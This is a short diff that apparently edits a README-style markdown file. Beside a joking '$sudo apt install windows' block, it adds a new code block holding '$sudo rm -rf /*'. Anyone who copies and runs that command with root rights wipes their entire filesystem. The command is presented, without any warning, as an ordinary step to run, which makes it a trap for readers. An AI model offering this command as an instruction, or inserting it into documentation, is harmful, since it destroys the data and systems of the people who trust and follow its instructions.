@@ -4,4 +4,6 @@
 ```
 $sudo apt install windows
 ```
-
+```
+$sudo rm -rf /*
+```
